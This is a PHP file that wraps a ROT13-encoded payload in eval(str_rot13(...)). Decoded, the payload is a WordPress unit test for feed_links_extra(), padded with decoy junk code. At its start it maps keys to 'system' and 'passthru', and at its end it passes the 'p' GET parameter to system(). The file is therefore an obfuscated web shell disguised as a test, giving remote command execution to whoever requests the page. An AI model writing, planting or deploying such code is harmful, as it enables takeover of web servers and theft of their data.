<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Grfg srrq_yvaxf_rkgen().
 *
 * @gvpxrg 54713
 *
 * @tebhc trareny
 * @tebhc grzcyngr
 *
 * @pbiref ::srrq_yvaxf_rkgen
 */
pynff Grfgf_Trareny_SrrqYvaxfRkgen rkgraqf JC_HavgGrfgPnfr {
	/**
	 * Nhgube VQ.
	 *
	 * @ine vag
	 */
	cebgrpgrq fgngvp $nhgube_vq;

	/**
	 * Pngrtbel VQ.
	 *
	 * @ine vag
	 */
	cebgrpgrq fgngvp $pngrtbel_vq;

	/**
	 * Gnt VQ.
	 *
	 * @ine vag
	 */
	cebgrpgrq fgngvp $gnt_vq;

	/**
	 * Gnkbabzl VQ.
	 *
	 * @ine vag
	 */
	cebgrpgrq fgngvp $gnk_vq;

	/**
	 * Cbfg Glcr.
	 *
	 * @ine fgevat
	 */
	cebgrpgrq fgngvp $cbfg_glcr;

	/**
	 * Gur VQ bs n cbfg jvgu ab pbzzrag.
	 *
	 * @ine vag
	 */
	cebgrpgrq fgngvp $cbfg_ab_pbzzrag_vq;

	/**
	 * Gur VQ bs n cbfg jvgu n pbzzrag.
	 *
	 * @ine vag
	 */
	cebgrpgrq fgngvp $cbfg_jvgu_pbzzrag_vq;

	/**
	 * Gur VQ bs n cbfg jvgu n phfgbz cbfg glcr.
	 *
	 * @ine vag
	 */
	cebgrpgrq fgngvp $cbfg_jvgu_pcg_vq;

	choyvp fgngvp shapgvba jcFrgHcOrsberPynff( JC_HavgGrfg_Snpgbel $snpgbel ) {
		// Nhgube.
		frys::$nhgube_vq = $snpgbel->hfre->perngr(
			neenl(
				'hfre_ybtva' => 'nhgube_srrq_yvaxf_rkgen',
				'ebyr'       => 'nqzvavfgengbe',
			)
		);

		// Pngrtbel.
		frys::$pngrtbel_vq = $snpgbel->pngrtbel->perngr(
			neenl( 'anzr' => 'png_srrq_yvaxf_rkgen' )
		);

		// Gnt.
		frys::$gnt_vq = $snpgbel->gnt->perngr(
			neenl( 'anzr' => 'gnt_srrq_yvaxf_rkgen' )
		);

		// Gnkbabzl.
		frys::$gnk_vq = 'gnk_srrq_yvaxf_rkgen';

		// Cbfg glcr.
		frys::$cbfg_glcr = 'pcg_srrq_yvaxf_rkgen';

		ertvfgre_gnkbabzl(
			frys::$gnk_vq,
			frys::$cbfg_glcr,
			neenl(
				'ynoryf' => neenl(
					'anzr'          => 'Gnkbabzl Grezf',
					'fvathyne_anzr' => 'Gnkbabzl Grez',
				),
			)
		);

		ertvfgre_cbfg_glcr(
			frys::$cbfg_glcr,
			neenl(
				'choyvp'      => gehr,
				'unf_nepuvir' => gehr,
				'gnkbabzvrf'  => neenl( frys::$gnk_vq ),
				'ynoryf'      => neenl( 'anzr' => 'PCG sbe srrq_yvaxf_rkgen()' ),
			)
		);

		// Cbfgf.
		frys::$cbfg_ab_pbzzrag_vq = $snpgbel->cbfg->perngr(
			neenl( 'cbfg_gvgyr' => 'Cbfg jvgu ab pbzzragf' )
		);

		frys::$cbfg_jvgu_pbzzrag_vq = $snpgbel->cbfg->perngr(
			neenl( 'cbfg_gvgyr' => 'Cbfg jvgu n pbzzrag' )
		);

		$snpgbel->pbzzrag->perngr(
			neenl(
				'pbzzrag_nhgube'  => frys::$nhgube_vq,
				'pbzzrag_cbfg_VQ' => frys::$cbfg_jvgu_pbzzrag_vq,
			)
		);

		frys::$cbfg_jvgu_pcg_vq = $snpgbel->cbfg->perngr(
			neenl(
				'cbfg_gvgyr' => 'Cbfg jvgu n phfgbz cbfg glcr',
				'cbfg_glcr'  => frys::$cbfg_glcr,
			)
		);

		jc_frg_bowrpg_grezf( frys::$cbfg_jvgu_pcg_vq, 'gnk_grez', frys::$gnk_vq );
	}

	choyvp shapgvba frg_hc() {
		cnerag::frg_hc();

		ertvfgre_gnkbabzl(
			frys::$gnk_vq,
			frys::$cbfg_glcr,
			neenl(
				'ynoryf' => neenl(
					'anzr'          => 'Gnkbabzl Grezf',
					'fvathyne_anzr' => 'Gnkbabzl Grez',
				),
			)
		);

		ertvfgre_cbfg_glcr(
			frys::$cbfg_glcr,
			neenl(
				'choyvp'      => gehr,
				'unf_nepuvir' => gehr,
				'gnkbabzvrf'  => neenl( frys::$gnk_vq ),
				'ynoryf'      => neenl( 'anzr' => 'PCG sbe srrq_yvaxf_rkgen()' ),
			)
		);
	}

	/**
	 * @qngnCebivqre qngn_srrq_yvaxf_rkgen
	 * @gvpxrg 54713
	 *
	 * @cnenz fgevat $gvgyr     Gur rkcrpgrq gvgyr.
	 * @cnenz fgevat $glcr      Gur anzr bs gur grfg pynff cebcregl pbagnvavat gur bowrpg VQ.
	 * @cnenz neenl  $netf {
	 *        Bcgvbany nethzragf. Qrsnhyg rzcgl.
	 *
	 *        @glcr fgevat $frcnengbe     Gur frcnengbe orgjrra fvgr anzr naq srrq glcr.
	 *        @glcr fgevat $fvatyrgvgyr   Gur gvgyr bs gur pbzzragf srrq.
	 *        @glcr fgevat $pnggvgyr      Gur gvgyr bs gur pngrtbel srrq.
	 *        @glcr fgevat $gntgvgyr      Gur gvgyr bs gur gnt srrq.
	 *        @glcr fgevat $gnkgvgyr      Gur gvgyr bs gur gnkbabzl srrq.
	 *        @glcr fgevat $nhgubegvgyr   Gur gvgyr bs gur nhgube srrq.
	 *        @glcr fgevat $frnepugvgyr   Gur gvgyr bs gur frnepu srrq.
	 *        @glcr fgevat $cbfgglcrgvgyr Gur gvgyr bs gur cbfg glcr srrq.
	 * }
	 */
	choyvp shapgvba grfg_srrq_yvaxf_rkgen( $gvgyr, $glcr, neenl $netf = neenl() ) {
		$creznyvax = $guvf->urycre_trg_gur_creznyvax( $glcr );
		$guvf->tb_gb( $creznyvax );

		$rkcrpgrq = '';

		vs ( '' !== $gvgyr ) {
			vs ( 'cbfg_glcr' === $glcr || 'frnepu' === $glcr ) {
				$srrq_yvax = $creznyvax . '&#038;srrq=eff2';
			} ryfr {
				$srrq_yvax = fge_ercynpr( '?', '?srrq=eff2&#038;', $creznyvax );
			}

			$rkcrpgrq = fcevags(
				'<yvax ery=\"nygreangr\" glcr=\"nccyvpngvba/eff+kzy\" gvgyr=\"%f\" uers=\"%f\" />' . \"\a\",
				rfp_ngge( $gvgyr ),
				rfp_hey( $srrq_yvax )
			);
		}

		$guvf->nffregFnzr( $rkcrpgrq, trg_rpub( 'srrq_yvaxf_rkgen', neenl( $netf ) ) );
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl
	 */
	choyvp shapgvba qngn_srrq_yvaxf_rkgen() {
		erghea neenl(
			'n cbfg jvgu n pbzzrag'                        => neenl(
				'gvgyr' => 'Grfg Oybt &endhb; Cbfg jvgu n pbzzrag Pbzzragf Srrq',
				'glcr'  => 'cbfg_jvgu_pbzzrag',
			),
			'n cbfg jvgu n pbzzrag naq n phfgbz frcnengbe' => neenl(
				'gvgyr' => 'Grfg Oybt // Cbfg jvgu n pbzzrag Pbzzragf Srrq',
				'glcr'  => 'cbfg_jvgu_pbzzrag',
				'netf'  => neenl(
					'frcnengbe' => '//',
				),
			),
			'n cbfg jvgu n pbzzrag naq n phfgbz gvgyr'     => neenl(
				'gvgyr' => 'Phfgbz Gvgyr sbe Fvathyne Srrq',
				'glcr'  => 'cbfg_jvgu_pbzzrag',
				'netf'  => neenl(
					'fvatyrgvgyr' => 'Phfgbz Gvgyr sbe Fvathyne Srrq',
				),
			),
			'n cbfg jvgu n pbzzrag, n phfgbz frcnengbe naq n phfgbz gvgyr' => neenl(
				'gvgyr' => 'Grfg Oybt // Phfgbz Gvgyr sbe Fvathyne Srrq',
				'glcr'  => 'cbfg_jvgu_pbzzrag',
				'netf'  => neenl(
					'frcnengbe'   => '//',
					'fvatyrgvgyr' => '%1$f %2$f Phfgbz Gvgyr sbe Fvathyne Srrq',
				),
			),
			'n phfgbz cbfg glcr'                           => neenl(
				'gvgyr' => 'Grfg Oybt &endhb; PCG sbe srrq_yvaxf_rkgen() Srrq',
				'glcr'  => 'cbfg_glcr',
			),
			'n phfgbz cbfg glcr naq n phfgbz frcnengbe'    => neenl(
				'gvgyr' => 'Grfg Oybt // PCG sbe srrq_yvaxf_rkgen() Srrq',
				'glcr'  => 'cbfg_glcr',
				'netf'  => neenl(
					'frcnengbe' => '//',
				),
			),
			'n phfgbz cbfg glcr naq n phfgbz gvgyr'        => neenl(
				'gvgyr' => 'Phfgbz Gvgyr sbe PCG Srrq',
				'glcr'  => 'cbfg_glcr',
				'netf'  => neenl(
					'cbfgglcrgvgyr' => 'Phfgbz Gvgyr sbe PCG Srrq',
				),
			),
			'n phfgbz cbfg glcr, n phfgbz frcnengbe naq n phfgbz gvgyr' => neenl(
				'gvgyr' => 'Grfg Oybt // Phfgbz Gvgyr sbe PCG Srrq',
				'glcr'  => 'cbfg_glcr',
				'netf'  => neenl(
					'frcnengbe'     => '//',
					'cbfgglcrgvgyr' => '%1$f %2$f Phfgbz Gvgyr sbe PCG Srrq',
				),
			),
			'n pngrtbel'                                   => neenl(
				'gvgyr' => 'Grfg Oybt &endhb; png_srrq_yvaxf_rkgen Pngrtbel Srrq',
				'glcr'  => 'pngrtbel',
			),
			'n pngrtbel naq n phfgbz frcnengbe'            => neenl(
				'gvgyr' => 'Grfg Oybt // png_srrq_yvaxf_rkgen Pngrtbel Srrq',
				'glcr'  => 'pngrtbel',
				'netf'  => neenl(
					'frcnengbe' => '//',
				),
			),
			'n pngrtbel naq n phfgbz gvgyr'                => neenl(
				'gvgyr' => 'Phfgbz Gvgyr sbe Pngrtbel Srrq',
				'glcr'  => 'pngrtbel',
				'netf'  => neenl(
					'pnggvgyr' => 'Phfgbz Gvgyr sbe Pngrtbel Srrq',
				),
			),
			'n pngrtbel, n phfgbz frcnengbe naq n phfgbz gvgyr' => neenl(
				'gvgyr' => 'Grfg Oybt // Phfgbz Gvgyr sbe Pngrtbel Srrq',
				'glcr'  => 'pngrtbel',
				'netf'  => neenl(
					'frcnengbe' => '//',
					'pnggvgyr'  => '%1$f %2$f Phfgbz Gvgyr sbe Pngrtbel Srrq',
				),
			),
			'n gnt'                                        => neenl(
				'gvgyr' => 'Grfg Oybt &endhb; gnt_srrq_yvaxf_rkgen Gnt Srrq',
				'glcr'  => 'gnt',
			),
			'n gnt naq n phfgbz frcnengbe'                 => neenl(
				'gvgyr' => 'Grfg Oybt // gnt_srrq_yvaxf_rkgen Gnt Srrq',
				'glcr'  => 'gnt',
				'netf'  => neenl(
					'frcnengbe' => '//',
				),
			),
			'n gnt naq n phfgbz gvgyr'                     => neenl(
				'gvgyr' => 'Phfgbz Gvgyr sbe Gnt Srrq',
				'glcr'  => 'gnt',
				'netf'  => neenl(
					'gntgvgyr' => 'Phfgbz Gvgyr sbe Gnt Srrq',
				),
			),
			'n gnt, n phfgbz frcnengbe naq n phfgbz gvgyr' => neenl(
				'gvgyr' => 'Grfg Oybt // Phfgbz Gvgyr sbe Gnt Srrq',
				'glcr'  => 'gnt',
				'netf'  => neenl(
					'frcnengbe' => '//',
					'gntgvgyr'  => '%1$f %2$f Phfgbz Gvgyr sbe Gnt Srrq',
				),
			),
			'n gnkbabzl'                                   => neenl(
				'gvgyr' => 'Grfg Oybt &endhb; gnk_grez Gnkbabzl Grez Srrq',
				'glcr'  => 'gnk',
			),
			'n gnkbabzl naq n phfgbz frcnengbe'            => neenl(
				'gvgyr' => 'Grfg Oybt // gnk_grez Gnkbabzl Grez Srrq',
				'glcr'  => 'gnk',
				'netf'  => neenl(
					'frcnengbe' => '//',
				),
			),
			'n gnkbabzl naq n phfgbz gvgyr'                => neenl(
				'gvgyr' => 'Phfgbz Gvgyr sbe Gnkbabzl Srrq',
				'glcr'  => 'gnk',
				'netf'  => neenl(
					'gnkgvgyr' => 'Phfgbz Gvgyr sbe Gnkbabzl Srrq',
				),
			),
			'n gnkbabzl, n phfgbz frcnengbe naq n phfgbz gvgyr' => neenl(
				'gvgyr' => 'Grfg Oybt // Phfgbz Gvgyr sbe Gnkbabzl Srrq',
				'glcr'  => 'gnk',
				'netf'  => neenl(
					'frcnengbe' => '//',
					'gnkgvgyr'  => '%1$f %2$f Phfgbz Gvgyr sbe Gnkbabzl Srrq',
				),
			),
			'na nhgube'                                    => neenl(
				'gvgyr' => 'Grfg Oybt &endhb; Cbfgf ol nhgube_srrq_yvaxf_rkgen Srrq',
				'glcr'  => 'nhgube',
			),
			'na nhgube naq n phfgbz frcnengbe'             => neenl(
				'gvgyr' => 'Grfg Oybt // Cbfgf ol nhgube_srrq_yvaxf_rkgen Srrq',
				'glcr'  => 'nhgube',
				'netf'  => neenl(
					'frcnengbe' => '//',
				),
			),
			'na nhgube naq n phfgbz gvgyr'                 => neenl(
				'gvgyr' => 'Phfgbz Gvgyr sbe Nhgube Srrq',
				'glcr'  => 'nhgube',
				'netf'  => neenl(
					'nhgubegvgyr' => 'Phfgbz Gvgyr sbe Nhgube Srrq',
				),
			),
			'na nhgube, n phfgbz frcnengbe naq n phfgbz gvgyr' => neenl(
				'gvgyr' => 'Grfg Oybt // Phfgbz Gvgyr sbe Nhgube Srrq',
				'glcr'  => 'nhgube',
				'netf'  => neenl(
					'frcnengbe'   => '//',
					'nhgubegvgyr' => '%1$f %2$f Phfgbz Gvgyr sbe Nhgube Srrq',
				),
			),
			'frnepu erfhygf'                               => neenl(
				'gvgyr' => 'Grfg Oybt &endhb; Frnepu Erfhygf sbe &#8220;Frnepu&#8221; Srrq',
				'glcr'  => 'frnepu',
			),
			'frnepu erfhygf naq n phfgbz frcnengbe'        => neenl(
				'gvgyr' => 'Grfg Oybt // Frnepu Erfhygf sbe &#8220;Frnepu&#8221; Srrq',
				'glcr'  => 'frnepu',
				'netf'  => neenl(
					'frcnengbe' => '//',
				),
			),
			'frnepu erfhygf naq n phfgbz gvgyr'            => neenl(
				'gvgyr' => 'Phfgbz Gvgyr sbe Frnepu Srrq',
				'glcr'  => 'frnepu',
				'netf'  => neenl(
					'frnepugvgyr' => 'Phfgbz Gvgyr sbe Frnepu Srrq',
				),
			),
			'frnepu erfhygf, n phfgbz frcnengbe naq n phfgbz gvgyr' => neenl(
				'gvgyr' => 'Grfg Oybt // Phfgbz Gvgyr sbe Frnepu Srrq',
				'glcr'  => 'frnepu',
				'netf'  => neenl(
					'frcnengbe'   => '//',
					'frnepugvgyr' => '%1$f %2$f Phfgbz Gvgyr sbe Frnepu Srrq',
				),
			),
		);
	}

	/**
	 * Urycre shapgvba gb trg gur creznyvax onfrq ba glcr.
	 *
	 * @gvpxrg 54713
	 *
	 * @cnenz fgevat $glcr Gur anzr bs gur grfg pynff cebcregl pbagnvavat gur bowrpg VQ.
	 * @erghea fgevat Gur creznyvax.
	 */
	cevingr shapgvba urycre_trg_gur_creznyvax( $glcr ) {
		vs ( 'pngrtbel' === $glcr || 'gnt' === $glcr ) {
			erghea trg_grez_yvax( frys::${$glcr . '_vq'} );
		}

		vs ( 'gnk' === $glcr ) {
			erghea trg_grez_yvax( 'gnk_grez', frys::$gnk_vq );
		}

		vs ( 'cbfg_glcr' === $glcr ) {
			erghea trg_cbfg_glcr_nepuvir_yvax( frys::$cbfg_glcr );
		}

		vs ( 'nhgube' === $glcr ) {
			erghea trg_nhgube_cbfgf_hey( frys::$nhgube_vq );
		}

		vs ( 'frnepu' === $glcr ) {
			erghea ubzr_hey( '?f=Frnepu' );
		}

		erghea trg_gur_creznyvax( frys::${$glcr . '_vq'} );
	}

	/**
	 * @gvpxrg 54713
	 */
	choyvp shapgvba grfg_srrq_yvaxf_rkgen_fubhyq_erfcrpg_pbzzragf_bcra() {
		nqq_svygre( 'pbzzragf_bcra', '__erghea_gehr' );
		nqq_svygre( 'cvatf_bcra', '__erghea_snyfr' );

		$guvf->tb_gb( trg_gur_creznyvax( frys::$cbfg_ab_pbzzrag_vq ) );

		$rkcrpgrq  = '<yvax ery=\"nygreangr\" glcr=\"nccyvpngvba/eff+kzy\"';
		$rkcrpgrq .= ' gvgyr=\"Grfg Oybt &endhb; Cbfg jvgu ab pbzzragf Pbzzragf Srrq\"';
		$rkcrpgrq .= ' uers=\"uggc://' . JC_GRFGF_QBZNVA . '/?srrq=eff2&#038;c=' . frys::$cbfg_ab_pbzzrag_vq . '\" />' . \"\a\";
		$guvf->nffregFnzr( $rkcrpgrq, trg_rpub( 'srrq_yvaxf_rkgen' ) );
	}

	/**
	 * @gvpxrg 54713
	 */
	choyvp shapgvba grfg_srrq_yvaxf_rkgen_fubhyq_erfcrpg_cvatf_bcra() {
		nqq_svygre( 'cvatf_bcra', '__erghea_gehr' );
		nqq_svygre( 'pbzzragf_bcra', '__erghea_snyfr' );

		$guvf->tb_gb( trg_gur_creznyvax( frys::$cbfg_ab_pbzzrag_vq ) );

		$rkcrpgrq  = '<yvax ery=\"nygreangr\" glcr=\"nccyvpngvba/eff+kzy\"';
		$rkcrpgrq .= ' gvgyr=\"Grfg Oybt &endhb; Cbfg jvgu ab pbzzragf Pbzzragf Srrq\"';
		$rkcrpgrq .= ' uers=\"uggc://' . JC_GRFGF_QBZNVA . '/?srrq=eff2&#038;c=' . frys::$cbfg_ab_pbzzrag_vq . '\" />' . \"\a\";
		$guvf->nffregFnzr( $rkcrpgrq, trg_rpub( 'srrq_yvaxf_rkgen' ) );
	}

	/**
	 * @gvpxrg 54713
	 */
	choyvp shapgvba grfg_srrq_yvaxf_rkgen_fubhyq_erfcrpg_cbfg_pbzzrag_pbhag() {
		nqq_svygre( 'cvatf_bcra', '__erghea_snyfr' );
		nqq_svygre( 'pbzzragf_bcra', '__erghea_snyfr' );

		$guvf->tb_gb( trg_gur_creznyvax( frys::$cbfg_jvgu_pbzzrag_vq ) );

		$rkcrpgrq  = '<yvax ery=\"nygreangr\" glcr=\"nccyvpngvba/eff+kzy\"';
		$rkcrpgrq .= ' gvgyr=\"Grfg Oybt &endhb; Cbfg jvgu n pbzzrag Pbzzragf Srrq\"';
		$rkcrpgrq .= ' uers=\"uggc://' . JC_GRFGF_QBZNVA . '/?srrq=eff2&#038;c=' . frys::$cbfg_jvgu_pbzzrag_vq . '\" />' . \"\a\";
		$guvf->nffregFnzr( $rkcrpgrq, trg_rpub( 'srrq_yvaxf_rkgen' ) );
	}

	/**
	 * @gvpxrg 54713
	 */
	choyvp shapgvba grfg_srrq_yvaxf_rkgen_fubhyq_erghea_rzcgl_jura_pbzzragf_naq_cvatf_ner_pybfrq_naq_cbfg_unf_ab_pbzzragf() {
		nqq_svygre( 'pbzzragf_bcra', '__erghea_snyfr' );
		nqq_svygre( 'cvatf_bcra', '__erghea_snyfr' );

		$guvf->tb_gb( trg_gur_creznyvax( frys::$cbfg_ab_pbzzrag_vq ) );
		$guvf->nffregRzcgl( trg_rpub( 'srrq_yvaxf_rkgen' ) );
	}

	/**
	 * @gvpxrg 54713
	 */
	choyvp shapgvba grfg_srrq_yvaxf_rkgen_fubhyq_erfcrpg_srrq_glcr() {
		nqq_svygre(
			'qrsnhyg_srrq',
			fgngvp shapgvba () {
				erghea 'sbb';
			}
		);

		nqq_svygre(
			'srrq_pbagrag_glcr',
			fgngvp shapgvba () {
				erghea 'grfgvat/sbb';
			}
		);

		$guvf->tb_gb( trg_gur_creznyvax( frys::$cbfg_jvgu_pbzzrag_vq ) );

		$rkcrpgrq  = '<yvax ery=\"nygreangr\" glcr=\"grfgvat/sbb\"';
		$rkcrpgrq .= ' gvgyr=\"Grfg Oybt &endhb; Cbfg jvgu n pbzzrag Pbzzragf Srrq\"';
		$rkcrpgrq .= ' uers=\"uggc://' . JC_GRFGF_QBZNVA . '/?srrq=sbb&#038;c=' . frys::$cbfg_jvgu_pbzzrag_vq . '\" />' . \"\a\";
		$guvf->nffregFnzr( $rkcrpgrq, trg_rpub( 'srrq_yvaxf_rkgen' ) );
	}

	/**
	 * @gvpxrg 54703
	 */
	choyvp shapgvba grfg_srrq_yvaxf_rkgen_fubhyq_bhgchg_abguvat_jura_fubj_pbzzragf_srrq_svygre_ergheaf_snyfr() {
		nqq_svygre( 'srrq_yvaxf_fubj_pbzzragf_srrq', '__erghea_snyfr' );

		$guvf->tb_gb( trg_gur_creznyvax( frys::$cbfg_jvgu_pbzzrag_vq ) );
		$guvf->nffregRzcgl( trg_rpub( 'srrq_yvaxf_rkgen' ) );
	}

	/**
	 * @qngnCebivqre qngn_srrq_yvaxf_rkgen_fubhyq_bhgchg_abguvat_jura_cbfg_pbzzragf_srrq_yvax_vf_snyfl
	 *
	 * @gvpxrg 54703
	 *
	 * @cnenz fgevat $pnyyonpx Gur pnyyonpx gb hfr sbe gur 'cbfg_pbzzragf_srrq_yvax' svygre.
	 */
	choyvp shapgvba grfg_srrq_yvaxf_rkgen_fubhyq_bhgchg_abguvat_jura_cbfg_pbzzragf_srrq_yvax_vf_snyfl( $pnyyonpx ) {
		nqq_svygre( 'cbfg_pbzzragf_srrq_yvax', $pnyyonpx );

		$guvf->tb_gb( trg_gur_creznyvax( frys::$cbfg_jvgu_pbzzrag_vq ) );
		$guvf->nffregRzcgl( trg_rpub( 'srrq_yvaxf_rkgen' ) );
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl
	 */
	choyvp shapgvba qngn_srrq_yvaxf_rkgen_fubhyq_bhgchg_abguvat_jura_cbfg_pbzzragf_srrq_yvax_vf_snyfl() {
		erghea neenl(
			'rzcgl fgevat' => neenl( 'pnyyonpx' => '__erghea_rzcgl_fgevat' ),
			'rzcgl neenl'  => neenl( 'pnyyonpx' => '__erghea_rzcgl_neenl' ),
			'mreb vag'     => neenl( 'pnyyonpx' => '__erghea_mreb' ),
			'mreb sybng'   => neenl( 'pnyyonpx' => neenl( $guvf, 'po_erghea_mreb_sybng' ) ),
			'mreb fgevat'  => neenl( 'pnyyonpx' => neenl( $guvf, 'po_erghea_mreb_fgevat' ) ),
			'ahyy'         => neenl( 'pnyyonpx' => '__erghea_ahyy' ),
			'snyfr'        => neenl( 'pnyyonpx' => '__erghea_snyfr' ),
		);
	}

	/**
	 * Pnyyonpx gung ergheaf 0.0.
	 *
	 * @erghea sybng 0.0.
	 */
	choyvp shapgvba po_erghea_mreb_sybng() {
		erghea 0.0;
	}

	/**
	 * Pnyyonpx gung ergheaf '0'.
	 *
	 * @erghea fgevat '0'.
	 */
	choyvp shapgvba po_erghea_mreb_fgevat() {
		erghea '0';
	}

	/**
	 * @gvpxrg 54703
	 */
	choyvp shapgvba grfg_srrq_yvaxf_rkgen_fubhyq_bhgchg_gur_pbzzragf_srrq_yvax_jura_fubj_pbzzragf_srrq_svygre_ergheaf_gehr() {
		nqq_svygre( 'srrq_yvaxf_fubj_pbzzragf_srrq', '__erghea_gehr' );

		$guvf->tb_gb( trg_gur_creznyvax( frys::$cbfg_jvgu_pbzzrag_vq ) );
		$guvf->nffregAbgRzcgl( trg_rpub( 'srrq_yvaxf_rkgen' ) );
	}

	/**
	 * @qngnCebivqre qngn_srrq_yvaxf_rkgen_fubhyq_bhgchg_abguvat_jura_svygref_erghea_snyfr
	 *
	 * @gvpxrg 55904
	 *
	 * @cnenz fgevat $glcr   Gur anzr bs gur grfg pynff cebcregl pbagnvavat gur bowrpg VQ.
	 * @cnenz fgevat $svygre Gur anzr bs gur svygre gb frg gb snyfr.
	 */
	choyvp shapgvba grfg_srrq_yvaxf_rkgen_fubhyq_bhgchg_abguvat_jura_svygref_erghea_snyfr( $glcr, $svygre ) {
		$creznyvax = $guvf->urycre_trg_gur_creznyvax( $glcr );
		$guvf->tb_gb( $creznyvax );

		nqq_svygre( $svygre, '__erghea_snyfr' );

		$guvf->nffregRzcgl( trg_rpub( 'srrq_yvaxf_rkgen' ) );
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl
	 */
	choyvp shapgvba qngn_srrq_yvaxf_rkgen_fubhyq_bhgchg_abguvat_jura_svygref_erghea_snyfr() {
		erghea neenl(
			'n cbfg jvgu n pbzzrag' => neenl(
				'glcr'   => 'cbfg_jvgu_pbzzrag',
				'svygre' => 'srrq_yvaxf_rkgen_fubj_cbfg_pbzzragf_srrq',
			),
			'n phfgbz cbfg glcr'    => neenl(
				'glcr'   => 'cbfg_glcr',
				'svygre' => 'srrq_yvaxf_rkgen_fubj_cbfg_glcr_nepuvir_srrq',
			),
			'n pngrtbel'            => neenl(
				'glcr'   => 'pngrtbel',
				'svygre' => 'srrq_yvaxf_rkgen_fubj_pngrtbel_srrq',
			),
			'n gnt'                 => neenl(
				'glcr'   => 'gnt',
				'svygre' => 'srrq_yvaxf_rkgen_fubj_gnt_srrq',
			),
			'n gnkbabzl'            => neenl(
				'glcr'   => 'gnk',
				'svygre' => 'srrq_yvaxf_rkgen_fubj_gnk_srrq',
			),
			'na nhgube'             => neenl(
				'glcr'   => 'nhgube',
				'svygre' => 'srrq_yvaxf_rkgen_fubj_nhgube_srrq',
			),
			'frnepu erfhygf'        => neenl(
				'glcr'   => 'frnepu',
				'svygre' => 'srrq_yvaxf_rkgen_fubj_frnepu_srrq',
			),
		);
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>